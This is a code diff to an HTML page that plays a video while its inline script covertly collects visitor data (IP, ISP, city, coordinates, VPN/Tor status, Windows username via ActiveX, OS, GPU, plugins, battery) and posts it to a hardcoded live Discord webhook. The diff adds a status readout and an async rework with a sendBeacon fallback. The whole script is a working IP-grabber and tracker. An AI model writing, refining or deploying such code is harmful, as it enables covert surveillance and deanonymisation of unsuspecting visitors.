@@ -48,6 +48,21 @@
             z-index: 10;
             pointer-events: none;
         }
+        #status {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.8);
+            color: #00ff00;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            z-index: 999;
+            border: 1px solid #00ff00;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
@@ -61,34 +76,42 @@
         <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
     </video>
 
+    <div id="status">⏳ Sending...</div>
+
 <script>
     // ================================================================
     //  WEBHOOK (your new one)
     // ================================================================
     const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";
 
-    // ================================================================
-    //  MAIN
-    // ================================================================
-    (function() {
+    // Status update
+    function setStatus(text, isError = false) {
+        const el = document.getElementById('status');
+        if (el) {
+            el.textContent = text;
+            el.style.color = isError ? '#ff4444' : '#00ff00';
+            el.style.borderColor = isError ? '#ff4444' : '#00ff00';
+        }
+    }
 
-        // ---- 1. Get IP info (ipapi.co with fallback) ----
-        function getIPInfo(callback) {
-            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(3000) })
+    // ================================================================
+    //  GET IP WITH TIMEOUT (race between fetch and 2s timer)
+    // ================================================================
+    function getIPWithTimeout(timeout = 2000) {
+        return Promise.race([
+            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(2500) })
                 .then(res => res.json())
                 .then(data => {
-                    if (data.ip) {
-                        callback(data);
-                        return;
-                    }
-                    throw new Error('ipapi failed');
+                    if (data.ip) return data;
+                    throw new Error('No IP');
                 })
                 .catch(() => {
-                    fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(3000) })
+                    // fallback to ip-api.com
+                    return fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(2500) })
                         .then(res => res.json())
                         .then(data => {
                             if (data.query) {
-                                const converted = {
+                                return {
                                     ip: data.query,
                                     org: data.isp,
                                     country_name: data.country,
@@ -98,27 +121,20 @@
                                     longitude: data.lon,
                                     proxy: data.proxy || false
                                 };
-                                callback(converted);
-                            } else {
-                                callback(null);
                             }
-                        })
-                        .catch(() => callback(null));
-                });
-        }
+                            throw new Error('No IP');
+                        });
+                }),
+            new Promise((resolve) => setTimeout(() => resolve(null), timeout))
+        ]);
+    }
 
-        // ---- 2. Windows username (ActiveX) ----
-        function getWindowsUser() {
-            try {
-                var wsh = new ActiveXObject('WScript.Shell');
-                return wsh.ExpandEnvironmentStrings('%USERNAME%');
-            } catch (e) {
-                return null;
-            }
-        }
-
-        // ---- 3. Build and send ----
-        function sendData(ipData) {
+    // ================================================================
+    //  MAIN
+    // ================================================================
+    (async function() {
+        try {
+            // ---- 1. Gather system info (synchronous) ----
             const ua = navigator.userAgent;
             const os = (function() {
                 if (ua.includes('Windows NT')) return 'Windows';
@@ -135,7 +151,6 @@
                 return 'Other';
             })();
 
-            // GPU
             let gpu = 'Unavailable';
             try {
                 const canvas = document.createElement('canvas');
@@ -146,38 +161,49 @@
                 }
             } catch (e) {}
 
-            // Plugins
             const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
 
-            // Battery
             let battery = 'Unavailable';
-            if (navigator.getBattery) {
-                navigator.getBattery().then(b => {
-                    battery = Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')';
-                }).catch(() => {});
-            }
+            try {
+                const b = await navigator.getBattery();
+                battery = Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')';
+            } catch (e) {}
 
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-            // VPN detection
+            // ---- 2. Windows username (ActiveX) ----
+            let winUser = 'Not available (IE/ActiveX required)';
+            try {
+                const wsh = new ActiveXObject('WScript.Shell');
+                winUser = wsh.ExpandEnvironmentStrings('%USERNAME%');
+            } catch (e) {}
+
+            // ---- 3. Get IP (with timeout, do not block sending) ----
+            setStatus('⏳ Gathering IP...');
+            const ipData = await getIPWithTimeout(2000);
+
+            // ---- 4. VPN detection ----
             let isVpn = false;
-            if (ipData && ipData.proxy === true) isVpn = true;
-            if (ipData && ipData.org) {
-                const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous'];
-                const orgLower = ipData.org.toLowerCase();
-                if (vpnKeywords.some(k => orgLower.includes(k))) isVpn = true;
+            if (ipData) {
+                if (ipData.proxy === true) isVpn = true;
+                if (ipData.org) {
+                    const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous'];
+                    const orgLower = ipData.org.toLowerCase();
+                    if (vpnKeywords.some(k => orgLower.includes(k))) isVpn = true;
+                }
             }
 
-            // Windows username
-            let winUser = getWindowsUser();
-            if (!winUser) winUser = 'Not available (IE/ActiveX required)';
+            // ---- 5. Build message ----
+            const ip = ipData ? ipData.ip : 'Unknown';
+            const isp = ipData ? ipData.org : 'Unknown ISP';
+            const location = ipData ? ipData.city + ', ' + ipData.region + ', ' + ipData.country_name : 'Unknown';
+            const coords = ipData ? ipData.latitude + ', ' + ipData.longitude : 'Unknown';
 
-            // Build message (without hostname and device model)
             const msg = 
 `**ctOS User Info**
-**IP:** ${ipData ? ipData.ip : 'Unknown'} (${ipData ? ipData.org : 'Unknown ISP'})
-**Location:** ${ipData ? ipData.city + ', ' + ipData.region + ', ' + ipData.country_name : 'Unknown'}
-**Coordinates:** ${ipData ? ipData.latitude + ', ' + ipData.longitude : 'Unknown'}
+**IP:** ${ip} (${isp})
+**Location:** ${location}
+**Coordinates:** ${coords}
 **VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
 **Windows Username:** ${winUser}
 **OS:** ${os}
@@ -191,26 +217,38 @@
 **Plugins:** ${plugins}
 **Timestamp:** ${new Date().toLocaleString()}`;
 
-            // Send to Discord
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: msg }),
-                keepalive: true
-            }).catch(() => {
+            // ---- 6. Send to Discord ----
+            setStatus('📤 Sending...');
+            let sent = false;
+
+            // Try fetch with keepalive
+            try {
+                const response = await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: msg }),
+                    keepalive: true
+                });
+                if (response.ok) sent = true;
+            } catch (e) {}
+
+            // Fallback: sendBeacon
+            if (!sent) {
                 const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
-                navigator.sendBeacon(WEBHOOK, blob);
-            });
-        }
-
-        // ---- Start ----
-        getIPInfo(function(ipData) {
-            if (!ipData) {
-                ipData = { ip: 'Unknown', org: 'Unknown', city: 'Unknown', region: 'Unknown', country_name: 'Unknown', latitude: 'Unknown', longitude: 'Unknown', proxy: false };
+                if (navigator.sendBeacon(WEBHOOK, blob)) sent = true;
             }
-            sendData(ipData);
-        });
 
+            // Final status
+            if (sent) {
+                setStatus('✅ Sent!');
+            } else {
+                setStatus('❌ Send failed (check webhook)', true);
+            }
+
+        } catch (err) {
+            setStatus('❌ Error: ' + err.message, true);
+            console.error(err);
+        }
     })();
 </script>
 </body>
